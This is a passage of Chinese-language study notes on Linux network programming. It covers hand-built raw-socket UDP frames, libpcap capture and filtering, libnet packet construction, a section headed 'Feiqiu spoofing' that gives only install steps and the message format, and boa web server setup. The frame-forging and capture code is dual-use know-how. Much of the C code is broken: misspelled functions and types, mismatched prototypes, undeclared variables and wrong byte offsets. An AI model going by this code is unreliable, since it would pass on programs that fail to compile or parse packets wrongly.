    u_int32_t daddr;//目的IP
    u_int8_t flag;//标记（0）
    u_int8_t type;//udp协议 17
    u_int32_t len;//长度
    
}WEIHDR;
#include <netinet/udp.h> //struct udphdr
struct udphdr *udp_hdr = (struct udphdr *)(msg+14+20);
udp_hdr->source = htons(8000);//源端口port
udp_hdr->dest = htons(9000);//目的端口port
udp_hdr->len = htons(8+data_len);//udp总长度=udp + data
udp_hdr->check = htons(0);//????  udp校验
//将data拷贝到udp的数据部分
mencpy(msg+14+20+8, data, data_len);

//准备udp校验
unsigned char wei_head[256] = "";
WEIHDR *wei_hdr = (WEIHDR *)wei_head;
memcpy(&wei_hdr->saddr, src_ip, 4);//源IP
memcpy(&wei_hdr->daddr, dst_ip, 4);//目的IP
wei_hdr->flag = 0;
wei_hdr->type = 17;
wei_hdr->len = htons(8+data_len);//与上面总长度相同
//将msg中的udp头部信息以及data数据，拷贝到伪头部后面
memcpy(wei_head+12, udp_hdr, 8+data_len);

//校验udp:伪头部 + udp头部 + data部分
udp_hdr->check = checksum(wei_head, 12+8+data_len);
```

UDP校验方式 ：

​	1、在对udp校验的时候需要在udp报文之间加上**伪头部**

​	2、IP校验的时候不需要**伪头部**

![image-20210929201408106](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929201408106.png)



校验示意图：

![image-20210929201813234](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929201813234.png)

**伪头部中的源IP、目的IP必须和IP报文中源IP、目的IP一致**



4）应用层数据



*示例代码：*

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <sys/ioctl,h>//ioctl
#include<net/if.h>//struct ifreq
#include <netpacket/packet.h>//struct sockaddr_ll
#include<pthread.h>
#include<unistd.h>//_exit
#include<string.h>//strncpy
#include<net/ethernet.h>//struct ether_header
#include<net/if_arp.h>//struct arphdr
#include <netinet/ip.h>//ip iphdr
#include <netinet/udp.h> //struct udphdr

//自定义结构体 WEIHDR
typedef struct 
{
  	u_int32_t saddr;//源IP
    u_int32_t daddr;//目的IP
    u_int8_t flag;//标记（0）
    u_int8_t type;//udp协议 17
    u_int32_t len;//长度
    
}WEIHDR;

//校验函数
unsigned short checksum(unsigned short *buf, int len)
{
    int nword = len/2;
    unsigned long sum;
    
    if(len%2 == 1)
        nword++;
    for(sum = 0; nword > 0; nword--)
    {
        sum += *buf;
        buf++;
    }
    sum = (sum>>16) + (sum&0xffff);
    sum += (sum>>16);
    return ~sum;
    
}

void my_sendto(char *outifc, unsigned char *msg, int msg_len);

int main()
{
    //1、创建原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //获取要发送的消息
    printf("请输入要发送的消息：");
    char data[128]="";
    fgets(data,sizeof(data),stdin);
    data[strlen(data)-1]=0;//去掉回车
    int data_len = strlen(data);
    //如果data_len不是偶数 补0为偶数
    if(data_len%2 != 0)//奇数
        data_len++;
    
    /*目的mac 源mac 目的IP 源IP*/
    unsigned char dst_mac[6]={0xC0,0xB5,0xD7,0xC4,0x3F,0x49}; 
    unsigned char src_mac[6]={0xC0,0xB5,0xD7,0xC4,0x3F,0x49};
    unsigned char dst_ip[4]={192,168,0,110};
    unsigned char src_ip[4]={192,168,0,107};
    
    unsigned char msg[1024]="";
    
    //1、组mac头部
    struct ether_header *eth_addr = (struct ether_header *)msg;
    //memcpy为内存操作的复制,参数分别为:目标地址,源地址,字节数
    //赋值目的mac地址
    memcpy(eth->ether_dhost,dst_mac,6);
    //赋值源mac地址
    memcpy(eth->ether_shost,src_mac,6);
    //赋值帧类型
    ether_addr->ether_type = htons(0x0800);
    
    //2、组IP报文
    struct iphdr *ip_hdr = (struct iphar *)(msg+14);
    ip_hdr->version = 4;//IPv4版本
    ip_hdr->ihl = 5;//IP头部长度 单位4B 总长为20B
    ip_hdr->tos = 0;//服务类型
    ip_hdr->tot_len = htons(20+8+data_len);//总长度=首部长度+数据长度
    ip_hdr->id = htons(0);//标识
    ip_hdr->frag_off =htons(0);//标志+片偏移
    ip_hdr->ttl = 128;//生命周期，64或128
    ip_hdr->protocol = 17;//协议  tcp是6  udp是17
    ip_hdr->check = htons(0);//首部校验？？？
    memcpy(&ip_hdr->saddr, src_ip, 4);//源IP地址
    memcpy(&ip_hdr->daddr, dst_ip, 4);//目的IP地址
    //ip报文头部校验
    ip_hdr->check = checksum(ip_hdr, 20);
    
    //3、UDP头部
    //自定义结构体 WEIHDR
    struct udphdr *udp_hdr = (struct udphdr *)(msg+14+20);
    udp_hdr->source = htons(8000);//源端口port
    udp_hdr->dest = htons(9000);//目的端口port
    udp_hdr->len = htons(8+data_len);//udp总长度=udp + data
    udp_hdr->check = htons(0);//????  udp校验
    //将data拷贝到udp的数据部分
    mencpy(msg+14+20+8, data, data_len);

    //准备udp校验
    unsigned char wei_head[256] = "";
    WEIHDR *wei_hdr = (WEIHDR *)wei_head;
    memcpy(&wei_hdr->saddr, src_ip, 4);//源IP
    memcpy(&wei_hdr->daddr, dst_ip, 4);//目的IP
    wei_hdr->flag = 0;
    wei_hdr->type = 17;
    wei_hdr->len = htons(8+data_len);//与上面总长度相同
    //将msg中的udp头部信息以及data数据，拷贝到伪头部后面
    memcpy(wei_head+12, udp_hdr, 8+data_len);

    //校验udp:伪头部 + udp头部 + data部分
    udp_hdr->check = checksum(wei_head, 12+8+data_len);
    
    
    //发送arp请求帧数据
    int i = 0;
    for(i=1;i<20;i++)//影响20秒
    {
        my_sendto(sockfd, "0xb", msg, 42);
        sleep(1);
    }
   
    close(sockfd);
    return 0;
}

//封装函数
void my_sendto(int sockfd, char *outifc, unsigned char *msg, int msg_len)
{
    //通过ioctl得到网络接口
    struct ifreq ethreq;
    strncpy(ethreq.ifr_name,outifc,IFNAMSIZ);//指定网卡名称
    //得到网络接口
    if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
    {
        perror("ioctl");
        close(sockfd);
        exit(-1);
    }
    
    //帧数据 出去的本地接口
    struct sockadr_ll sll;
    bzero(&sll,sizeof(sll));
    
    sll.sll_ifindex = ethreq.ifr_ifindex;
    
    //2、发送组好的帧数据
    sendto(sockfd,msg,msg_len,0,(struct sockaddr *)&sll,sizeof(sll));
}
```



### 八、libpcap 与 libnet 库

#### 8.1飞秋欺骗

1、windows安装飞秋：双击运行

2、Ubuntu安装飞秋：sudo apt-get install iptux

3、Ubuntu运行飞秋：iptux&

4、飞秋的格式：

​	版本 : 包编号 : 主机名 :命令字 : 附加消息

​	飞秋的端口为2425固定（设置-->网络设置  可以改端口）



#### 8.2 libpcap

##### 1、libpcap的主要作用

​	1.捕获各种数据包

​		例如：网络流量统计

​	2.过滤网络数据包

​		例如：过滤掉本地上的一些数据，类似防火墙

​	3.分析网络数据包

​		例如：分析网络协议，数据的采集

​	4.存储网络数据包

​		例如：保存捕获的数据以为将来进行分析



##### 2、libpcap安装

​	sudo apt-get install libpcap-dev



##### 3、libpcap开发实例

##### 	1.利用libpcap函数库开发应用程序的基本步骤：

​		1）打开网络设备

​		2）设置过滤规则

​		3）捕获数据

​		4）关闭网络设备

##### 	2.捕获网络数据包常用函数

```c
//查看设备名
pcap_lookupdev();//可选

//打开设备（重点）
pcap_open_live();

//获取的设备IP
pcap_lookupnet();//可选

//设置过滤规则
pcap_compile();
pcap_setfilter();//可选

//捕获数据
pcap_next();//调用一次，捕获一次报文
pcap_loop();//调用一次，不停捕获报文

pcap_close();
```



![image-20211002180944174](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211002180944174.png)



捕获数据的网络接口

```c
pcap_t *pcap_open_live(const char *device,int snaplen,int promise,int to_ms,char *ebuf);
```

功能：

​	打开一个用于捕获数据的网络接口

返回值：

​	返回一个libpcap句柄

参数：

​	device：网络接口的名字

​	snaplen：捕获数据包的长度

​	promise：1 代表混杂模式，其他非混杂模式

​	to_ms：等待时间

​	ebuf：存储错误信息



关闭句柄

```c
void pcap_close(pcap_t *p);
```

功能：

​	关闭libpcap操作，并销毁相应的资源

参数：

​	p：需要关闭的libpcap句柄

返回值：

​	无



接收报文函数

```c
const u_char *pcap_next(pcap_t *p,struct pcap_pkthdr *h);
```

功能：

​	捕获一个网络数据包

参数：

​	p：libpcap句柄

​	h：数据包头

返回值：

​	捕获的数据包地址



struct pcap_pkthdr结构体信息——记录接收数据的时间以及报文的长度

```c
struct pcap_pkthdr{
    struct timeval ts; //时间
    bpf_u_int32 caplen; //部分包长度（基本和len一样）
    bpf_u_int32 len;  //包的长度
};
```



*示例代码：*

```c
#include <stdio.h>
#include <pcap.h>
int main()
{
    //1、创建一个pcap句柄
    pcap_t *pcap_handle = NULL;
    pcap_handle = pcap_open_live("eth0",1500,0,0,NULL);
    
    //2、接收数据
    struct pcap_pkthdr pck_hdr;//记录收到数据的时间
    unsigned char *msg = NULL;//存放接收到的帧数据
    msg = pcap_next(pcap_handle, &pck_hdr);
    printf("报文长度：%u\n", pck_hdr.caplen);
    
    //msg:mac ip udp/tcp data
    //msg的mac地址解析 和 原始套接字一样
    //解析msg的mac地址
    char src_mac[18]="";
    char dst_mac[18]="";
    sprintf(dst_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0],msg[2],msg[3],msg[4],msg[5],msg[6]);
    sprintf(src_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0+6],msg[2+6],msg[3+6],msg[4+6],msg[5+6],msg[6+6]);
    printf("%s---->%s",src_mac,dst_mac);
    
    
    
    //关闭句柄
    pcap_close(pcap_handle);
    return 0;
}
```



##### 3.循环捕获网络数据

```c
int pcap_loop(pcap_t *p,int cnt,pcap_handler callback,u_char *user);
```

功能：

​	循环捕获网络数据包，直到遇到错误或者满足退出条件；

​	每次捕获一个数据包就会调用callback指示的回调函数，

​	所以，可以在回调函数中进行数据包的处理操作

返回值：

​	成功返回0，失败返回负数

参数：

​	p：libpcap句柄

​	cnt：指定捕获数据包的个数，如果是-1，就会永无休止的捕获

​	callback：回调函数

​	user：向回调函数中传递的参数



![image-20211006230022943](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211006230022943.png)



*示例代码：*

```c
#include <stdio.h>
#include <pcap.h>
//pcap_loop没收到一个报文，就会调用一次回调函数
void callback(u_char *arg, const struct pcap_pkthdr *packet_header, const u_char *packet_content)
{
    unsigned char *msg = packet_content;
    printf("报文长度:%\n", packet_header->caplen);
    //msg:mac ip udp/tcp data
    //msg的mac地址解析 和 原始套接字一样
    //解析msg的mac地址
    char src_mac[18]="";
    char dst_mac[18]="";
    sprintf(dst_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0],msg[2],msg[3],msg[4],msg[5],msg[6]);
    sprintf(src_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0+6],msg[2+6],msg[3+6],msg[4+6],msg[5+6],msg[6+6]);
    printf("%s---->%s\n",src_mac,dst_mac);
}

int main()
{
    //1、创建一个pcap句柄
    pcap_t *pcap_handle = NULL;
    pcap_handle = pcap_open_live("eth0",1500,0,0,NULL);
    
    //2、接收数据
    //带阻塞（句柄 接收个数 回调函数  ）
    pcap_loop(pcap_handle, 5, callback, NULL);
    
    //关闭句柄
    pcap_close(pcap_handle);
    return 0;
}
```



##### 4.设置过滤规则

两个函数

（1）

```c
//将用户识别的规则 转换成pcap识别的规则
int pcap_compile(pcap_t *p,struct bpf_program *program,
                char *buf,int optimize,
                bpf_u_int32 mask);
```

功能：

​	编译 BPF 过滤规则

返回值：

​	成功返回0，失败返回-1

参数：

​	p：libpcap句柄

​	program：bpf过滤规则（pcap识别的规则）

​	buf：过滤规则字符串（用户识别的规则）

​	optimize：优化

​	mask：子网掩码

![image-20211006230817895](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211006230817895.png)



（2）

```c
//将pcap识别的规则 设置到pcap接收数据的句柄中
pcap_setfilter(pcap *p,struct bpf_program *fp);
```

功能：

​	设置BPF过滤规则

返回值：

​	成功返回0，失败返回-1

参数：

​	p：libpcap句柄

​	fp： BPF 过滤规则

![image-20211006231332426](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211006231332426.png)



*示例代码：*

```c
#include <stdio.h>
#include <pcap.h>

//pcap_loop没收到一个报文，就会调用一次回调函数
void callback(u_char *arg, const struct pcap_pkthdr *packet_header, const u_char *packet_content)
{
    unsigned char *msg = packet_content;
    printf("报文长度:%\n", packet_header->caplen);
    //msg:mac ip udp/tcp data
    //msg的mac地址解析 和 原始套接字一样
    //解析msg的mac地址
    char src_mac[18]="";
    char dst_mac[18]="";
    sprintf(dst_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0],msg[2],msg[3],msg[4],msg[5],msg[6]);
    sprintf(src_mac,"%02x:%02x:%02x:%02x:%02x:%02x",msg[0+6],msg[2+6],msg[3+6],msg[4+6],msg[5+6],msg[6+6]);
    printf("%s---->%s\n",src_mac,dst_mac);
}

int main()
{
    //1、创建一个pcap句柄
    pcap_t *pcap_handle = NULL;
    pcap_handle = pcap_open_live("eth0",1500,0,0,NULL);
    
    //设置过滤规则
    struct bpf_program program;
    //参数:句柄  生成规则  规则制定  优化  子网掩码
    pcap_compile(pcap_handle,&program,"src port 9000",0,0xffffff00);
    pcap_setfilter(pcap_handle,&program);
    
    //2、接收数据
    //带阻塞（句柄 接收个数 回调函数  ）
    pcap_loop(pcap_handle, 5, callback, NULL);
    
    //关闭句柄
    pcap_close(pcap_handle);
    return 0;
}
```



#### 8.3 libnet——发送原始套接字数据

专业的构造和发送网络数据包的开发工具包

是个高层次的API函数库，允许开发者自己构造和发送网络数据包

**头文件：#include <libnet.h>**

**编译后缀添加：-lnet**



##### 1.libnet特点

​	1）隐藏了很多底层细节，省去了很多麻烦；如缓冲器管理、字节流顺序、校验和计算等问题，使开发者把重心放到程序开发中。

​	2）可以轻松、快捷的构造任何形式的网络数据包，从而开发各种各样的网络程序。

​	3）使用非常广泛，例如著名软件Ettercap、Firewalk、Snort、Tcpreplay等。

​	4）在1998年就出现了，但那时还有很多缺陷，比如计算校验和非常繁琐等；从2001年开始libnet作者 Mike Schiffman 对其进行了完善，而且功能更强大。至此，可以说libnet开发包已经趋于完美，使用者越来越多。



##### 2.libnet安装

sudo apt-get install libnet-dev



##### 3.libnet开发流程

利用libnet函数库开发应用程序的基本步骤：

​	1）数据包内存初始化

​	2）构造数据包

​	3）发送数据

​	4）释放资源



##### 4.相关函数

1）**内存管理相关函数**

​	初始化

```c
libnet_t *libnet_init(int injection_type,char *device,char *err_buf);
```

功能：

​	数据包内存初始化及环境建立

参数：

​	injection_type：构造的类型

```c
(LIBNET_LINK, LIBNET_RAW4（推荐）,
 LIBNET_LINK_ADV, LIBNET_RAW4_ADV)
```

​	device：网络接口，如 “ eth0 ”，或IP地址，亦可为NULL（自动查询搜索）

​	err_buf：存放出错的信息 



![image-20211006233003742](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211006233003742.png)

![image-20211006233022536](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211006233022536.png)





2）**释放资源**

```c
void libnet_destory(libnet_t *l);
```

功能：

​	释放资源

参数：

​	l：libnet句柄



3）**构建udp报文**

```c
libnet_ptag_t libnet_build_udp(
u_int16_t sp,u_int16_t dp,
u_int16_t len,u_int16_t sum,
u_int8_t *payload,u_int32_t payload_s,
libnet_t *l,lilbnet_ptag_t ptag)
```

功能：

​	构造udp数据包

返回值：

​	成功返回协议标记；失败返回-1

参数：

​	sp：源端口

​	dp：目的端口

​	len：udp包总长度

​	sum：校验和，设为0，libnet自动填充

​	payload：负载，可设置为NULL

​	payload_s：负载长度，或为0

​	l：libnet句柄

​	ptag：协议标记



4）**构建IPv4数据包**

```c
libnet_ptag_t libnet_build_ipv4(
u_int16_t ip_len, u_int8_t tos,
u_int16_t id, u_int16_t flag,
u_int8_t ttl, u_int8_t prot,
u_int16 sum, u_int8_t src,
u_int32_t dst, u_int8_t *payload,
u_int32_t payload_s, 
u_int32_t *l, libnet_ptag_t ptag);
```

功能：

​	构造一个IPv4数据包

参数：

​	ip_len：ip包总长

​	tos：服务类型

​	id：ip标识

​	flag：片偏移

​	ttl：生存时间

​	prot：上层协议

​	sum：校验和，设为0，libnet自动填充

​	src：源IP地址

​	dst：目的IP地址

​	payload：负载，可设置为NULL

​	payload_s：负载长度，或为0

​	l：libnet句柄

​	ptag：协议标记

返回值：

​	成功返回协议标记，错误返回-1



5）**构建以太网数据包**

```c
libnet_ptag_t libnet_build_ethernet(
u_int8_t *dst, u_int8_t *src,
u_int16_t type, 
u_int8_t *payload,
u_int32_t payload_s, 
u_int32_t *l, libnet_ptag_t ptag);
```

功能：

​	构造一个以太网数据包

参数：

​	dst：目的mac

​	src：源mac

​	type：上层协议类型

​	payload：负载，即附带的数据，可设置为NULL

​	payload_s：负载长度，或为0

​	l：libnet句柄

​	ptag：协议标记

返回值：

​	成功返回协议标记，失败返回-1



6）**发送数据到网络**

```c
int write(libnet_t *l);
```

功能：

​	发送数据到网络

参数：

​	l：libnet句柄

返回值：

​	失败返回-1，成功返回其他



*示例代码：*

```c
#include <stdio.h>
#include <libnet.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main()
{
    //1、初始化内存
    libnet_t *lib_handle = libnet_init(LIBNET_LINK_ADV,"eth0",NULL);
    
    char data[128] = "";
	printf("请输入要发送的udp数据:");
    fgets(data,sizeof(buf),stdin);
    buf[strlen(buf)-1]=0;
    //把数据整合成偶数
    int data_len = strlen(data)+strlen(data)%2;
    
    //构建数据包：从应用层---->链路层
    //1、构建udp数据
    libnet_ptg_t ptag_udp = libnet_build_udp(8000,9000,8+data_len,0,data,data_len,lib_handle,0);
    
    //2、构建IP报文
    libnet_ptag_t ptag_ip = 							libnet_build_ipv4(20+8+data_len,0,0,0,128,17,\
    0,inet_addr("192.168.0.111"),\
    inet_addr("192.168.0.110"),\
    NULL,0,lib_handle,0);
    
    //3、构建mac数据报文
    unsigned char src_mac[6] = {0x00,0x0c,0x29,0x79,0xf9,0x7f};
    unsigned char dst_mac[6] = {0x70,0x5a,0x0f,0x63,0xf5,0x9d};
    libnet_ptag_t ptag_mac = 							libnet_build_ethernet(dst_mac,src_mac,0x0800,\
    NULL,0,lib_handle,0);
    
    //4、发送帧数据
    libnet_write(lib_handle);
    
    //循环发送5次
    int i=0;
    for(i=0;i<5;i++)
    {
        printf("请输入要发送的udp数据:");
        fgets(data,sizeof(buf),stdin);
    buf[strlen(buf)-1]=0;
    //把数据整合成偶数
    data_len = strlen(data)+strlen(data)%2;
        
        //重新构建udp数据
        ptag_udp = libnet_build_udp(8000,9000,8+data_len,0,data,data_len,lib_handle,ptag_udp);
        //重新构建IP报文
        ptag_ip = 							libnet_build_ipv4(20+8+data_len,0,0,0,128,17,\
    0,inet_addr("192.168.0.111"),\
    inet_addr("192.168.0.110"),\
    NULL,0,lib_handle,ptag_ip);
        
        libnet_write(lib_handle);
            
    }
    
    
    //释放资源
    libnet_destory(lib_handle);
    return 0;
}
```



### 九、BS开发（浏览器/服务器）

#### ![image-20211012161040595](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012161040595.png)

#### 9.1 Ubuntu下的boa服务器搭建

#### 1、搭建流程

##### 2.Ubuntu中解压

![image-20211012163046738](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012163046738.png)



##### 3.ls查看文件

![image-20211012163342543](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012163342543.png)



##### 4.进入src目录

![image-20211012163529303](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012163529303.png)



##### 5.ls查看目录内容

![image-20211012163701202](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012163701202.png)



#### 2、将来的bos服务器目录结构分析

##### 1.创建以下目录结构

![image-20211012164804138](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012164804138.png)



##### 2.创建boa目录

命令： mkdir ~/share/boa/boa -p

![image-20211012165049010](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012165049010.png)



##### 3.创建log目录

命令： mkdir ~/share/boa/log

![image-20211012165120925](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012165120925.png)



##### 4.创建www以及cgi-bin目录

命令：mkdir ~/share/boa/www/cgi-bin -p

![image-20211012165448092](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211012165448092.png)



操作：

![image-20211016171200594](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016171200594.png)



![image-20211016171238385](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016171238385.png)



##### 5.将boa.conf服务器的配置文件拷贝到/home/edu/share/boa/boa目录中

![image-20211016171541626](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016171541626.png)

将 boa.conf  拷贝到 /home/edu/share/boa/boa 下

命令：cp boa.conf /home/edu/share/boa/boa

![image-20211016172418802](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016172418802.png)



将 /usr/share/cups/mime/mime.types 拷贝到 /home/edu/share/boa/boa 下：

命令：sudo cp /usr/share/cups/mime/mime.types /home/edu/share/boa/boa

![image-20211016173116369](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016173116369.png)



##### 6.配置boa服务器在运行的时候，去/home/edu/share/boa/boa 下查找配置文件boa.conf

1）修改路径

![image-20211016173834818](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016173834818.png)

编辑此文件

目录下命令：sudo gedit define.h

改成

![image-20211016174714560](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016174714560.png)



##### 7.编译服务器源码

（1）./configure 生成 Makefile

![image-20211016175216689](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016175216689.png)



（2）make 编译源码

命令：make

开始编译

![image-20211016214433063](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016214433063.png)



没有error，编译成功

![image-20211016215559686](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016215559686.png)





QS：常见问题

1.XXX：命令未找到

![image-20211016214658007](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016214658007.png)

​	确少相应的插件，需要用更新源进行插件的安装或更新。

此处为如下命令：

![image-20211016214913622](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211016214913622.png)



若仍有此问题，则继续安装相应插件即可，直到开始构建为止。



（3）将当前路径下的服务器boa拷贝到/home/edu/share/boa/boa下

命令：cp boa /home/edu/share/boa/boa

如图：

![image-20211017163300391](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017163300391.png)



##### 8.在log目录下添加 error_log 、access_log 两个文件

命令：touch（新建）

![image-20211017163944648](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017163944648.png)



##### 9.在www目录下创建一个index.html网页

命令： sudo touch  index.html

![image-20211017165110399](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017165110399.png)



##### 10.修改 /home/edu/share/boa/boa/boa.conf

命令：cd /home/edu/share/boa/boa/boa.conf

（1）用notepad++ 打开 boa.conf

​	![image-20211017165841406](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017165841406.png)



（2）

![image-20211017170557415](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017170557415.png)



（3）

![image-20211017170949324](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017170949324.png)



（4）

![image-20211017171139645](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017171139645.png)



（5）

![image-20211017171435597](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017171435597.png)



（6）

![image-20211017171655196](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20211017171655196.png)



##### 11.启动boa服务器

命令：cd /home/edu/share/boa/boa

edu@edu:~/share/boa/boa$ sudo ./boa
[sudo] edu 的密码： 
edu@edu:~/share/boa/boa$ ps -A|grep boa
edu@edu:~/share/boa/boa$ ps -A | grep boa

